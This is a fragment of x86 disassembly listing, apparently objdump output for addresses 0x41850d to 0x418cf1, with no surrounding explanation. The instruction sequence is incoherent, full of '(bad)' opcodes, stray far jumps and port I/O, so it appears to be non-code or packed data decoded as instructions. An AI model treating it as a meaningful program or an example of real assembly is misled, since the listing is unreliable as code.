  41850d:	bound  edi,QWORD PTR [esi+0x4e]
  418510:	mov    ebx,0xc63625c0
  418515:	(bad)  
  418516:	jnp    0x41855b
  418518:	adc    eax,0x54b2dfd0
  41851d:	jbe    0x41850f
  41851f:	mov    edx,0x78e6354
  418524:	sub    al,0xf5
  418526:	or     BYTE PTR [edx+0x20142cf6],ah
  41852c:	cld    
  41852d:	scas   al,BYTE PTR es:[edi]
  41852e:	fadd   DWORD PTR [eax-0x5d]
  418531:	dec    esi
  418532:	cmp    cl,dh
  418534:	sub    dh,dh
  418536:	jp     0x4185a0
  418538:	loopne 0x41859d
  41853a:	add    BYTE PTR [ecx+0x381fa156],ah
  418540:	das    
  418541:	retf   0xb3b
  418544:	sbb    eax,0x9fd02e9b
  418549:	cld    
  41854a:	or     edi,DWORD PTR [esi]
  41854c:	dec    ebp
  41854d:	jne    0x418587
  41854f:	retf   0xa51b
  418552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418553:	mov    esi,0x273276de
  418558:	dec    ebx
  418559:	cwde   
  41855a:	sbb    ebp,eax
  41855c:	mov    eax,0x7d1611eb
  418561:	fwait
  418562:	pop    esi
  418563:	xor    edi,ecx
  418565:	dec    edx
  418566:	pop    ebx
  418567:	ret    
  418568:	mov    edi,0x8c8fb714
  41856d:	pop    ebp
  41856e:	xchg   ebx,eax
  41856f:	or     ebx,DWORD PTR [ebx-0x53]
  418572:	enter  0xc0c6,0xd8
  418576:	fwait
  418577:	inc    ebx
  418578:	push   esi
  418579:	pop    ebx
  41857a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41857b:	pop    edx
  41857c:	push   ds
  41857d:	lds    esp,FWORD PTR [ebp-0x3564071d]
  418583:	xor    ecx,DWORD PTR [ebp+0xc0a694]
  418589:	ret    
  41858a:	rol    al,0x1e
  41858d:	js     0x4185bf
  41858f:	enter  0x8307,0xe4
  418593:	push   0x47dde08
  418598:	mov    ebp,ebp
  41859a:	push   esi
  41859b:	cmp    eax,0x3991f71
  4185a0:	(bad)  
  4185a1:	test   eax,0x234e2093
  4185a6:	scas   al,BYTE PTR es:[edi]
  4185a7:	add    esi,DWORD PTR [edx]
  4185a9:	jne    0x418558
  4185ab:	cmp    al,0x9d
  4185ad:	xchg   ch,al
  4185af:	push   es
  4185b0:	pop    ds
  4185b1:	aas    
  4185b2:	mov    cs,ecx
  4185b4:	inc    esi
  4185b5:	(bad)  
  4185b7:	xor    dl,BYTE PTR [ecx]
  4185b9:	or     eax,0x45dec802
  4185be:	shrd   edx,eax,cl
  4185c1:	jb     0x4185ec
  4185c3:	int3   
  4185c4:	pop    eax
  4185c5:	out    0x5c,eax
  4185c7:	ds das 
  4185c9:	xor    al,0xc3
  4185cb:	xor    esi,DWORD PTR [ebp+0x2b]
  4185ce:	jmp    0x418624
  4185d0:	push   esi
  4185d1:	mov    dh,0xeb
  4185d4:	fidivr WORD PTR [esi+0x3f]
  4185d8:	std    
  4185d9:	and    BYTE PTR [edx+0x79],dh
  4185dc:	aam    0x5a
  4185de:	jae    0x4185b6
  4185e0:	out    dx,eax
  4185e1:	icebp  
  4185e2:	(bad)  
  4185e3:	int    0xf4
  4185e5:	cmp    eax,0xde4d23c
  4185ea:	outs   dx,BYTE PTR ds:[esi]
  4185eb:	test   eax,0x8f884bfe
  4185f0:	scas   eax,DWORD PTR es:[edi]
  4185f1:	mov    ds:0x75b312f,eax
  4185f6:	jg     0x4185d5
  4185f8:	es int 0x0
  4185fb:	and    al,0x14
  4185fd:	sub    edx,DWORD PTR [eax+0x0]
  418600:	test   BYTE PTR [ebx+ecx*1-0x522d2ed1],bh
  418607:	mov    bh,0xc1
  418609:	jmp    0x7e59:0x8af82bce
  418610:	cmp    eax,ecx
  418612:	mov    ds:0x992ecdec,al
  418617:	arpl   WORD PTR [ebx+ebx*8-0x1b908740],cx
  41861e:	jp     0x418628
  418620:	sbb    BYTE PTR [eax-0x5],bl
  418623:	mov    BYTE PTR [eax+0x46ecab5f],al
  418629:	mov    esp,0x6dc675c0
  41862e:	mov    dl,0xfb
  418630:	pop    ecx
  418631:	iret   
  418632:	sbb    cl,dh
  418634:	xchg   esi,eax
  418635:	test   al,0xc0
  418637:	aas    
  418638:	stos   DWORD PTR es:[edi],eax
  418639:	adc    ch,ch
  41863b:	daa    
  41863c:	xchg   ebx,eax
  41863d:	ins    BYTE PTR es:[edi],dx
  41863e:	outs   dx,DWORD PTR ds:[esi]
  41863f:	adc    DWORD PTR [ebx+0x54],0xfb36a2ce
  418646:	cmp    edx,DWORD PTR [ebx+0x53]
  418649:	xor    DWORD PTR [esi+0x39],0xd580cb8
  418650:	push   cs
  418651:	or     BYTE PTR [esi+0x34afb5aa],0x65
  418658:	push   edi
  418659:	in     al,0x34
  41865b:	test   eax,0x6c1d5e5d
  418660:	sahf   
  418661:	call   0x46b1f19a
  418666:	clc    
  418667:	fisttp QWORD PTR [ecx+edx*4+0x27]
  41866b:	int    0x6b
  41866d:	jmp    0x4541:0x32512c32
  418674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418675:	and    DWORD PTR [ebp+0x7],ebp
  418678:	retf   0x970d
  41867b:	pop    eax
  41867c:	sti    
  41867d:	loope  0x4186b6
  41867f:	sub    bl,BYTE PTR [ebx+0x76]
  418682:	mov    ecx,0xf8032570
  418687:	cmp    dh,dh
  418689:	or     ebp,edi
  41868b:	in     al,dx
  41868c:	test   dh,bh
  41868e:	or     ecx,DWORD PTR [edx+0x273d885f]
  418694:	sbb    esp,DWORD PTR [edi-0x353f4bb3]
  41869a:	and    BYTE PTR [eax+0x78460d91],ah
  4186a0:	popa   
  4186a1:	(bad)  
  4186a2:	xlat   BYTE PTR ss:[ebx]
  4186a4:	call   0xe5c:0x6a3415d6
  4186ab:	sub    eax,0xdda97e99
  4186b0:	mov    dh,0xe7
  4186b2:	mov    esp,0xa9c5c630
  4186b7:	outs   dx,BYTE PTR ds:[esi]
  4186b8:	loope  0x4186df
  4186ba:	inc    edi
  4186bb:	enter  0x99bf,0x9e
  4186bf:	rcl    esi,cl
  4186c1:	inc    ebx
  4186c2:	inc    eax
  4186c3:	test   eax,0xb5665b31
  4186c8:	icebp  
  4186c9:	or     al,0x98
  4186cb:	pop    ebx
  4186cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186cd:	mov    ebp,DWORD PTR [ebx+0x335d302f]
  4186d3:	mov    ds:0xb4b07de5,eax
  4186d8:	dec    eax
  4186d9:	pop    ds
  4186da:	or     al,0x80
  4186dc:	popf   
  4186dd:	enter  0xc33b,0xf3
  4186e1:	jno    0x4186c6
  4186e3:	and    esi,edi
  4186e5:	jle    0x418733
  4186e7:	jmp    0xbe60:0x39328207
  4186ee:	sbb    al,0x8a
  4186f0:	dec    ebp
  4186f1:	mov    al,ds:0x5ad7134d
  4186f6:	sbb    ch,bh
  4186f8:	outs   dx,DWORD PTR ds:[esi]
  4186f9:	and    esi,DWORD PTR ds:0xaf0f5857
  4186ff:	or     al,0x7b
  418701:	std    
  418702:	push   es
  418703:	inc    esp
  418704:	(bad)  
  418705:	out    dx,al
  418706:	jmp    0x50d55cd6
  41870b:	nop
  41870c:	test   eax,0x4a3f3c1b
  418711:	or     al,0xf6
  418713:	ffree  st(1)
  418715:	stc    
  418716:	mov    fs,WORD PTR [edi-0x792c5c54]
  41871c:	(bad)  
  41871d:	call   0x79aa:0x6ee1e81d
  418724:	or     esp,DWORD PTR [eax+0x179fdd3b]
  41872a:	sub    ecx,esi
  41872c:	inc    ebp
  41872d:	les    ecx,FWORD PTR [ecx+0x2fc8a6b]
  418733:	jg     0x41876f
  418735:	push   edi
  418736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418737:	jb     0x418794
  418739:	sub    al,0xaa
  41873b:	cmp    al,0xd2
  41873d:	(bad)  
  41873e:	loopne 0x418707
  418740:	and    al,0x9a
  418742:	outs   dx,DWORD PTR ds:[esi]
  418743:	fimul  DWORD PTR ds:0x2a1c64ea
  418749:	jne    0x41874d
  41874b:	mov    eax,0xf779e68c
  418750:	cmp    edi,DWORD PTR [edi]
  418752:	lea    edi,[edi+0x45]
  418755:	push   es
  418756:	and    BYTE PTR [ebp+0x22af2086],dl
  41875c:	push   eax
  41875d:	jp     0x4186f2
  41875f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418760:	loope  0x418717
  418762:	push   edi
  418763:	pop    esp
  418764:	sub    ecx,ecx
  418766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418767:	push   cs
  418768:	mov    al,0x6c
  41876a:	loopne 0x41879d
  41876c:	arpl   WORD PTR [ecx-0x46],ax
  41876f:	adc    DWORD PTR [esi+0x4b],edi
  418772:	js     0x4187e6
  418774:	ja     0x4187b9
  418776:	ret    0x8c5b
  418779:	(bad)  
  41877a:	sub    al,0xc4
  41877c:	cmp    eax,0x73ba4654
  418781:	mov    esp,0x1817180
  418786:	cmp    esp,DWORD PTR [edx+0x53]
  418789:	fwait
  41878a:	xor    edi,edx
  41878c:	stos   BYTE PTR es:[edi],al
  41878d:	inc    ebx
  41878e:	mov    esp,0xe564d2f0
  418793:	adc    ebp,DWORD PTR [esi]
  418795:	lods   eax,DWORD PTR ds:[esi]
  418796:	sub    bl,BYTE PTR [ebp+ecx*1+0x16]
  41879a:	popa   
  41879b:	arpl   WORD PTR [esi],ax
  41879d:	and    dh,0x93
  4187a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187a1:	xchg   edi,eax
  4187a2:	or     bh,BYTE PTR [esi+eax*2]
  4187a5:	call   0xc3bf:0x60b808d1
  4187ac:	push   ds
  4187ad:	xchg   ebp,eax
  4187ae:	sti    
  4187af:	pop    ebx
  4187b0:	scas   eax,DWORD PTR es:[edi]
  4187b1:	inc    edx
  4187b2:	retf   0x7768
  4187b5:	std    
  4187b6:	stos   DWORD PTR es:[edi],eax
  4187b7:	bound  ebx,QWORD PTR [esi-0x60a173f6]
  4187bd:	pop    edx
  4187be:	mov    edi,0xe81f812e
  4187c3:	jmp    0x7c10eb1d
  4187c8:	inc    esi
  4187c9:	cmp    BYTE PTR [esi-0x15e33805],0xbb
  4187d0:	seta   BYTE PTR ds:0x1e10700
  4187d7:	ins    BYTE PTR es:[edi],dx
  4187d8:	shl    DWORD PTR [edi+0x64],0x3
  4187dc:	xchg   esp,eax
  4187dd:	(bad)  
  4187df:	ret    0x69f4
  4187e2:	xchg   bl,dl
  4187e4:	in     eax,dx
  4187e5:	loopne 0x418776
  4187e7:	(bad)  
  4187e9:	ret    0x3353
  4187ec:	add    ah,BYTE PTR [esi]
  4187ee:	popf   
  4187ef:	pop    es
  4187f0:	xchg   dh,bh
  4187f2:	add    bh,al
  4187f4:	adc    eax,0x58446b88
  4187f9:	cs dec ebp
  4187fb:	cmp    eax,0xe6f017f
  418800:	scas   al,BYTE PTR es:[edi]
  418801:	mov    es,edx
  418803:	mov    bh,0x9c
  418805:	rep stos DWORD PTR es:[edi],eax
  418807:	les    eax,FWORD PTR [edi-0x60]
  41880a:	mov    ebx,0x9fdd4b7d
  41880f:	push   esi
  418810:	loope  0x4187f5
  418812:	test   BYTE PTR [ebp+0x33],0x3f
  418816:	loope  0x418867
  418818:	push   ebx
  418819:	retf   
  41881a:	aad    0xab
  41881c:	inc    ebp
  41881d:	or     dh,BYTE PTR [ebp+ebp*2-0x3edf54f5]
  418824:	mov    esp,0x26ebf9c
  418829:	out    dx,eax
  41882a:	and    BYTE PTR gs:[esi+0x3f],bh
  41882e:	je     0x418876
  418830:	jg     0x418818
  418832:	lods   al,BYTE PTR ds:[esi]
  418833:	adc    DWORD PTR [edx-0x11],eax
  418836:	shl    BYTE PTR [edi+0x73],cl
  418839:	dec    ebp
  41883a:	inc    eax
  41883b:	add    eax,DWORD PTR [ebp-0x6659897b]
  418841:	push   edx
  418842:	mov    ss:0x98b93af,eax
  418848:	push   0x5d
  41884a:	xor    al,0xd1
  41884c:	dec    ecx
  41884d:	add    DWORD PTR [ebp-0x38],eax
  418850:	call   0x1c8fa432
  418855:	dec    ecx
  418856:	lods   eax,DWORD PTR ds:[esi]
  418857:	addr16 jb 0x4188d9
  41885a:	lods   eax,DWORD PTR ds:[esi]
  41885b:	pop    es
  41885c:	dec    ecx
  41885d:	popa   
  41885e:	dec    esi
  41885f:	cwde   
  418860:	mov    ah,0xa3
  418862:	pop    ebx
  418863:	jp     0x418884
  418865:	push   edx
  418866:	in     al,dx
  418867:	mov    esp,0x423dc598
  41886c:	out    dx,eax
  41886d:	inc    esp
  41886e:	std    
  41886f:	fwait
  418870:	xor    al,0xe5
  418872:	push   edx
  418873:	je     0x41883c
  418875:	sbb    eax,0x905d68cc
  41887a:	mov    edx,0x3eb98405
  41887f:	repz inc edi
  418881:	mov    ds:0x81195d62,eax
  418886:	nop
  418887:	mov    bh,0xe5
  418889:	ret    
  41888a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41888b:	rep lods eax,DWORD PTR ds:[esi]
  41888d:	sbb    ebx,DWORD PTR [edx+0x5bb8085f]
  418893:	ins    BYTE PTR es:[edi],dx
  418894:	xor    ebp,DWORD PTR [ebx-0x37fb319d]
  41889a:	dec    edx
  41889b:	mov    ch,BYTE PTR [ecx+0x5b]
  41889e:	dec    ebx
  41889f:	inc    ecx
  4188a0:	test   ebx,0x1da0d5ac
  4188a6:	jae    0x418926
  4188a8:	jl     0x4188e4
  4188aa:	mov    ds:0x88bff72c,al
  4188af:	mov    BYTE PTR [edi-0x12],dh
  4188b2:	stc    
  4188b3:	or     DWORD PTR [edx+edi*1],esi
  4188b6:	repnz push ecx
  4188b8:	dec    ebp
  4188b9:	xor    dl,BYTE PTR [ebx]
  4188bb:	bound  edx,QWORD PTR [edi]
  4188bd:	sub    esp,DWORD PTR [ecx]
  4188bf:	in     al,dx
  4188c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188c1:	pop    ebp
  4188c2:	jge    0x4188db
  4188c4:	fs loopne 0x41892f
  4188c7:	std    
  4188c8:	mov    DWORD PTR [ecx+0x10],ebx
  4188cb:	mov    eax,ds:0x6369ddb0
  4188d0:	jae    0x41890c
  4188d2:	pop    ebp
  4188d3:	ins    BYTE PTR es:[edi],dx
  4188d4:	add    ebx,DWORD PTR [eax]
  4188d6:	mov    esp,0xbce10b6b
  4188db:	sbb    al,0x20
  4188dd:	mov    edx,0x1e1e315
  4188e2:	lds    ecx,FWORD PTR [ebx-0x5876cab7]
  4188e8:	sbb    cl,BYTE PTR [edx-0x2d]
  4188eb:	cmp    BYTE PTR [ebx+0x1b28185a],bl
  4188f1:	pop    esp
  4188f2:	cmp    ch,ch
  4188f4:	jnp    0x4188d7
  4188f6:	pusha  
  4188f7:	repz loopne 0x418954
  4188fa:	sub    eax,DWORD PTR [ecx+0x6be39788]
  418900:	or     DWORD PTR [edx+0xc],ebx
  418903:	add    al,0xf7
  418905:	clc    
  418906:	gs in  al,dx
  418908:	pop    ebx
  418909:	mov    eax,ds:0x85b70e47
  41890e:	aaa    
  41890f:	or     DWORD PTR [esi+0xc],ecx
  418912:	cmp    esp,DWORD PTR [edi+0x15]
  418915:	out    0x96,al
  418917:	push   esp
  418918:	jle    0x4188ad
  41891a:	addr16 mov ss:0x818c,eax
  41891f:	push   esi
  418920:	lods   eax,DWORD PTR ds:[esi]
  418921:	(bad)  
  418922:	and    eax,0x7d183cec
  418927:	jns    0x4189a3
  418929:	pop    es
  41892a:	push   ds
  41892b:	jae    0x41894f
  41892d:	dec    ecx
  41892e:	sbb    eax,DWORD PTR [ebp-0x533b0cbb]
  418934:	lock xor al,0x59
  418937:	sub    al,0x8
  418939:	aad    0xcf
  41893b:	xlat   BYTE PTR ds:[ebx]
  41893c:	sbb    eax,0x22814ede
  418941:	(bad)  
  418942:	lock dec edx
  418944:	dec    edi
  418945:	or     al,0x6f
  418947:	inc    ecx
  418948:	fsubr  st,st(3)
  41894a:	mov    al,0xd2
  41894c:	ret    
  41894d:	ror    BYTE PTR [eax+0x2bf4a26],0x2a
  418954:	lea    ebp,[edx-0x2c048284]
  41895a:	jne    0x418995
  41895c:	add    ch,cl
  41895e:	cmp    eax,0x1b89f4b2
  418963:	nop
  418964:	test   DWORD PTR [eax+0x42185967],esi
  41896a:	pop    ebp
  41896b:	xchg   ch,bh
  41896d:	ja     0x418923
  41896f:	jge    0x4188f3
  418971:	dec    ecx
  418972:	leave  
  418973:	pop    ebp
  418974:	clc    
  418975:	cmp    al,0x78
  418977:	push   edx
  418978:	sti    
  418979:	add    al,0x8d
  41897b:	cdq    
  41897c:	scas   eax,DWORD PTR es:[edi]
  41897d:	cmp    bh,BYTE PTR [ebx]
  41897f:	xchg   esi,eax
  418980:	test   al,0x7a
  418982:	std    
  418983:	xchg   esi,eax
  418984:	mov    gs,WORD PTR [edx+ebp*1]
  418987:	scas   al,BYTE PTR es:[edi]
  418988:	or     BYTE PTR [edi],ah
  41898a:	xor    BYTE PTR [edi-0x36],ah
  41898d:	fdiv   DWORD PTR [eax+0x6d053c00]
  418993:	lds    ebp,FWORD PTR [eax-0x6694445a]
  418999:	jle    0x418933
  41899b:	dec    esp
  41899c:	xchg   DWORD PTR [ebp-0x6ba8787],edi
  4189a2:	cld    
  4189a3:	xchg   ecx,eax
  4189a4:	shr    BYTE PTR [edx-0x33],0xa7
  4189a8:	cdq    
  4189a9:	int    0x7f
  4189ab:	xchg   edi,eax
  4189ac:	std    
  4189ad:	stos   DWORD PTR es:[edi],eax
  4189ae:	mov    ss,ebp
  4189b0:	outs   dx,DWORD PTR ds:[esi]
  4189b1:	cs jg  0x418963
  4189b4:	mov    bl,0xca
  4189b6:	enter  0x63a8,0x11
  4189ba:	pop    ds
  4189bb:	ret    0xb3cb
  4189be:	sbb    edx,DWORD PTR [ebp+0x4f38e6a5]
  4189c4:	je     0x418a16
  4189c6:	or     dh,0x75
  4189c9:	inc    ebp
  4189ca:	push   ecx
  4189cb:	cwde   
  4189cc:	push   0x7f
  4189ce:	hlt    
  4189cf:	ficomp WORD PTR [edi-0x10]
  4189d2:	inc    ebx
  4189d3:	or     edi,0x310e8be0
  4189d9:	into   
  4189da:	aaa    
  4189db:	clc    
  4189dc:	scas   al,BYTE PTR es:[edi]
  4189dd:	xchg   ecx,eax
  4189de:	in     al,dx
  4189df:	jp     0x418a46
  4189e1:	dec    ebp
  4189e2:	sbb    BYTE PTR [edi+0xc5df3f4],0xa8
  4189e9:	mov    bl,0x6e
  4189eb:	enter  0xab8d,0x7c
  4189ef:	dec    esp
  4189f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189f1:	out    0xa4,al
  4189f3:	and    al,0x5a
  4189f5:	push   0xa6777f84
  4189fa:	and    eax,0x34f01e71
  4189ff:	in     al,dx
  418a00:	mov    ch,0x13
  418a02:	lds    ebp,FWORD PTR [esp+esi*4+0x40]
  418a06:	fld    QWORD PTR [eax-0x5a13354a]
  418a0c:	cmp    DWORD PTR [esi],edi
  418a0e:	pusha  
  418a0f:	mov    ebx,0x192861cd
  418a14:	sub    al,0x44
  418a16:	lahf   
  418a17:	out    dx,eax
  418a18:	and    DWORD PTR [esi+0x1b],0x1f
  418a1c:	dec    esi
  418a1d:	dec    ebp
  418a1e:	out    0xa3,al
  418a20:	into   
  418a21:	mov    dl,0x9e
  418a23:	mov    esp,0xb270648e
  418a28:	xor    eax,DWORD PTR [eax+eax*4+0x6e]
  418a2c:	dec    esi
  418a2d:	je     0x4189d5
  418a2f:	je     0x418aa0
  418a31:	xor    al,0xa3
  418a33:	sbb    edx,edx
  418a35:	mov    dl,0xd1
  418a37:	test   esi,esi
  418a39:	cmc    
  418a3a:	dec    edx
  418a3b:	loop   0x418aa7
  418a3d:	ret    0x50a7
  418a40:	mov    al,fs:0xabdfd78f
  418a46:	cdq    
  418a47:	add    BYTE PTR [esi+0x628eb94],dh
  418a4d:	dec    bp
  418a4f:	fiadd  WORD PTR [ebx+0x480977b4]
  418a55:	repz rcl dh,cl
  418a58:	add    DWORD PTR [ebx],edx
  418a5a:	jnp    0x418a1f
  418a5c:	aam    0x2c
  418a5e:	jmp    0x2c12:0x3d650fc8
  418a65:	test   bl,dh
  418a67:	push   eax
  418a68:	push   esp
  418a69:	mov    esi,0x945cbc0f
  418a6e:	push   esi
  418a6f:	les    ebx,FWORD PTR ds:0x9758cfea
  418a75:	loop   0x418a93
  418a77:	enter  0x7eac,0x5e
  418a7b:	test   BYTE PTR ds:0x5f15617c,dl
  418a81:	inc    edx
  418a82:	fild   QWORD PTR [ebx]
  418a84:	daa    
  418a85:	add    edi,eax
  418a87:	pop    edx
  418a88:	ret    0x9006
  418a8b:	mov    edi,0x60265cd9
  418a90:	(bad)  
  418a91:	sti    
  418a92:	lods   al,BYTE PTR ds:[esi]
  418a93:	pop    es
  418a94:	mul    bl
  418a96:	sbb    ecx,DWORD PTR [ebx-0x7adb4784]
  418a9c:	and    BYTE PTR [ebp+0x2],0xd
  418aa0:	icebp  
  418aa1:	and    DWORD PTR [edx],0x9a13c357
  418aa7:	mov    eax,ds:0xc859d851
  418aac:	sub    eax,0xb905ea14
  418ab1:	and    DWORD PTR [ebx],eax
  418ab3:	xor    eax,0x1c74209f
  418ab8:	mov    dh,0x18
  418aba:	dec    edx
  418abb:	jns    0x418aac
  418abd:	(bad)  
  418abe:	push   0x4626ccc8
  418ac3:	push   ss
  418ac4:	sub    DWORD PTR [esi-0x3f],ebx
  418ac7:	sti    
  418ac8:	sub    DWORD PTR [ecx+0x26],edx
  418acb:	aaa    
  418acc:	sahf   
  418acd:	mov    ch,0xe3
  418acf:	test   al,0xad
  418ad1:	mov    edi,0xa096674d
  418ad6:	bound  ecx,QWORD PTR [ecx+0x7c]
  418ad9:	out    0x74,al
  418adb:	mov    esi,0x69b727b5
  418ae0:	adc    al,0xd3
  418ae2:	cli    
  418ae3:	loopne 0x418b49
  418ae5:	iret   
  418ae6:	sbb    ah,al
  418ae8:	sar    BYTE PTR [bp+si+0x65cf],cl
  418aed:	push   ecx
  418aee:	ret    0x88f8
  418af1:	mov    esp,0xf1804ff6
  418af6:	mov    bl,0x24
  418af8:	mov    esp,0x8c206246
  418afd:	icebp  
  418afe:	pop    ebp
  418aff:	mov    ds:0x4375d919,eax
  418b04:	mov    bl,dl
  418b06:	cmp    al,0xee
  418b08:	jo     0x418b00
  418b0a:	nop
  418b0b:	jle    0x418ae1
  418b0d:	pop    edx
  418b0e:	out    dx,eax
  418b0f:	int3   
  418b10:	xor    eax,0x6fd9c124
  418b15:	shl    al,1
  418b17:	inc    edx
  418b18:	sub    eax,ebx
  418b1a:	dec    esi
  418b1b:	aas    
  418b1c:	(bad)  
  418b1d:	popa   
  418b1e:	pop    ebp
  418b1f:	and    eax,DWORD PTR [edx+0x34dc32d0]
  418b25:	cmp    eax,edx
  418b27:	and    ecx,DWORD PTR [edi]
  418b29:	ds xchg ebx,eax
  418b2b:	aaa    
  418b2c:	fstp   DWORD PTR [ecx]
  418b2e:	and    esp,eax
  418b30:	pop    es
  418b31:	iret   
  418b32:	cmp    DWORD PTR [ebx-0x65],0x6f
  418b36:	adc    al,BYTE PTR [ecx+0x3e7f51c6]
  418b3c:	jbe    0x418b6a
  418b3e:	jne    0x418acf
  418b40:	mov    esp,0xb277dfc3
  418b45:	sub    al,0xe
  418b47:	cmp    ebx,esi
  418b49:	daa    
  418b4a:	ficom  DWORD PTR [edi+0x13]
  418b4d:	jle    0x418bcd
  418b4f:	leave  
  418b50:	add    bh,BYTE PTR [ecx]
  418b52:	or     eax,0xa57fb880
  418b57:	push   ds
  418b58:	pushf  
  418b59:	mov    edx,0xc945a3c6
  418b5e:	xchg   edx,eax
  418b5f:	stos   BYTE PTR es:[edi],al
  418b60:	mov    eax,0x7c620b51
  418b65:	(bad)  
  418b66:	stos   BYTE PTR es:[edi],al
  418b67:	je     0x418b06
  418b69:	dec    ecx
  418b6a:	mov    ebx,0x1515ce5
  418b6f:	mov    ch,0x2c
  418b71:	das    
  418b72:	jle    0x418b97
  418b74:	adc    bh,0xb2
  418b77:	fsub   st,st(7)
  418b79:	nop
  418b7a:	mov    eax,ds:0xa1bf27f8
  418b7f:	push   esi
  418b80:	fcomp  QWORD PTR [edx+0x19ce7dca]
  418b86:	ficom  DWORD PTR [ecx+0x26b24306]
  418b8c:	lock adc BYTE PTR [ebp+0x12252402],ch
  418b93:	data16 test al,0x47
  418b96:	ficomp DWORD PTR [ecx+0x62]
  418b99:	sbb    DWORD PTR [edx+edx*1],edi
  418b9c:	add    edx,DWORD PTR [edi+edi*8-0x50]
  418ba0:	fnsave [edx-0x5c699095]
  418ba6:	les    esp,FWORD PTR [esi-0x3]
  418ba9:	fwait
  418baa:	lahf   
  418bab:	dec    eax
  418bac:	aad    0x33
  418bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418baf:	div    DWORD PTR [edx]
  418bb1:	ins    DWORD PTR es:[edi],dx
  418bb2:	mov    esp,0xa1224a9
  418bb7:	cdq    
  418bb8:	ins    BYTE PTR es:[edi],dx
  418bb9:	and    BYTE PTR [eax+0x18f7123a],cl
  418bbf:	ds (bad) 
  418bc1:	mov    eax,0xda0be504
  418bc6:	jmp    0xd779:0x3069015c
  418bcd:	call   0xd695:0x620fe0a3
  418bd4:	aas    
  418bd5:	scas   eax,DWORD PTR es:[edi]
  418bd6:	test   eax,0x8c1234f5
  418bdb:	add    al,BYTE PTR [ebx]
  418bdd:	xor    ah,BYTE PTR ds:0xe0c20e14
  418be3:	xchg   esi,eax
  418be4:	aas    
  418be5:	mov    ch,0xf8
  418be7:	add    edx,DWORD PTR [ebx+0x150523ca]
  418bed:	xchg   ebx,eax
  418bee:	xor    ebp,esi
  418bf0:	aad    0xea
  418bf2:	out    0x2d,al
  418bf4:	mov    DWORD PTR [eax-0x4c3d192b],0x1e32866d
  418bfe:	mov    bh,0x29
  418c00:	gs mov edx,0x6da4574d
  418c06:	push   0x9d4a2c09
  418c0b:	xchg   esp,eax
  418c0c:	push   0x398e025
  418c11:	or     eax,0xf02a799a
  418c16:	fs xchg edi,eax
  418c18:	retf   
  418c19:	into   
  418c1a:	dec    edi
  418c1b:	push   ds
  418c1c:	jl     0x418bf0
  418c1e:	ss out dx,eax
  418c20:	and    bl,BYTE PTR [eax]
  418c22:	jl     0x418c0c
  418c24:	jge    0x418c7c
  418c26:	mov    WORD PTR [ecx],cs
  418c28:	iret   
  418c29:	mov    bh,0x8f
  418c2b:	xchg   edx,eax
  418c2c:	pop    ss
  418c2d:	imul   DWORD PTR [edx-0x41]
  418c30:	jmp    0xf89b:0xfd3a24d6
  418c37:	sub    dl,0xf3
  418c3a:	mov    ecx,0x6fb41458
  418c3f:	(bad)  [esi]
  418c41:	scas   al,BYTE PTR es:[edi]
  418c42:	jmp    0x418cbc
  418c44:	mov    DWORD PTR [edi],ebp
  418c46:	add    esp,DWORD PTR [edx+0x54]
  418c49:	out    dx,eax
  418c4a:	sbb    eax,0x5559352
  418c4f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c51:	in     al,dx
  418c52:	jns    0x418be5
  418c54:	shl    al,0x80
  418c57:	sub    DWORD PTR ds:0x176be853,ebp
  418c5d:	ds mov cs,eax
  418c60:	cdq    
  418c61:	lahf   
  418c62:	cmp    esi,DWORD PTR [esi]
  418c64:	mov    bh,0xc1
  418c66:	pop    es
  418c67:	and    dh,BYTE PTR [ecx]
  418c69:	add    BYTE PTR [esi+0x15],ah
  418c6c:	lods   al,BYTE PTR ds:[esi]
  418c6d:	jecxz  0x418cd9
  418c6f:	push   cs
  418c70:	dec    ebp
  418c71:	cmp    cl,0xc8
  418c74:	xchg   ecx,eax
  418c75:	sbb    edx,DWORD PTR [eax+0xf]
  418c78:	adc    edx,esp
  418c7a:	pop    eax
  418c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c7c:	retf   
  418c7d:	sub    edx,DWORD PTR [eax]
  418c7f:	or     dl,bh
  418c81:	cli    
  418c82:	sbb    eax,0xf27585e2
  418c87:	jp     0x418cd8
  418c89:	dec    ecx
  418c8a:	sbb    dl,bh
  418c8c:	aam    0x35
  418c8e:	(bad)
  418c91:	xchg   ecx,eax
  418c92:	cmc    
  418c93:	ret    0xfb04
  418c96:	sbb    BYTE PTR [eax-0x388df0fa],0x87
  418c9d:	cli    
  418c9e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ca0:	xor    DWORD PTR [ebp-0x7ad9bd47],edx
  418ca6:	mov    ebp,0x10e22d96
  418cab:	or     dh,0x8e
  418cae:	test   al,0xbd
  418cb0:	in     eax,dx
  418cb1:	mov    edi,0x58006dc9
  418cb6:	sub    DWORD PTR [ebx-0x53],ebp
  418cb9:	xor    cl,BYTE PTR [ebx+0x2063ed7c]
  418cbf:	enter  0xe58d,0xab
  418cc3:	int3   
  418cc4:	add    DWORD PTR [edx-0x5f11bebe],ecx
  418cca:	cli    
  418ccb:	mov    ds:0x7700c7ac,al
  418cd0:	or     al,BYTE PTR [ebx]
  418cd2:	stos   BYTE PTR es:[edi],al
  418cd3:	fdiv   QWORD PTR [ecx+0x2c26790b]
  418cd9:	out    dx,al
  418cda:	fiadd  WORD PTR [edi-0x78]
  418cdd:	jl     0x418cc5
  418cdf:	jecxz  0x418cb2
  418ce1:	push   edx
  418ce2:	mov    fs,WORD PTR [ebx-0x2f9f877b]
  418ce8:	ret    
  418ce9:	sbb    BYTE PTR [ebx+edi*1-0x74],0x22
  418cee:	(bad)  
  418cef:	arpl   WORD PTR [ebx],ax
  418cf1:	and    ah,BYTE PTR [ecx+0x1832f7b6]
